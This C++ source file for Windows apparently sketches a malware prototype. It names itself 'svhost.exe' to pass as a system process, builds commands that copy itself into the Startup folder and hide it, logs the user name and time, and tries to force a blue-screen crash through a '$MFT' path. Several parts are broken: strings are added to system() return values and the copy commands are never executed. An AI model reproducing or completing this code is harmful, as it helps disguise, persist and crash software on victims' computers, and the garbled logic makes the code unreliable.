#include <iostream>
#include <cstdlib>
#include <filesystem>
#include <windows.h>
#include <string>
#include <fstream>

void _CallBSoD() {
	HANDLE hFile = NULL;
	hFile = CreateFileW(L"C:\\$MFT\\BSoDFile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	CloseHandle(hFile);
}

const char* app_name = "svhost.exe";
const char* installer_path = "C:\\Bootstrap";
char* auto_run_path = getenv("AppData");
char command[512];

std::string genLogs() {
    const char* User = "Current user: " + system("echo %Username%");
    const char* Time = "Current time: " + system("echo date");
    std::string Logs = std::string(User) + "\n" + Time;
    return Logs;
}

void SetLogFile() {
    std::ofstream file("C:\\Bootstrap\\ReSumEmp.log");
    if (file.is_open()) {
        file << genLogs();
        file.close();
    }
}

void Regen() {
    strcat(auto_run_path, "\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
    sprintf(command, "copy \"%s\" \"%s\" && copy \"%s\" \"%s\" && attrib +h \"%s\\ReSumEmp.exe\"", app_name, auto_run_path, app_name, installer_path, auto_run_path);

    const char* app_name = "svhost.exe";
    const char* auto_run_path = getenv("APPDATA");
    std::string filePath = std::string(auto_run_path) + "\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + app_name;

    if (!std::filesystem::exists(filePath)) {
        std::string command = "start \"\" \"" + filePath + "\"";
        SetLogFile();
        _CallBSoD();
    }
}

const std::string filePath = "C:\\Bootstrap\\";
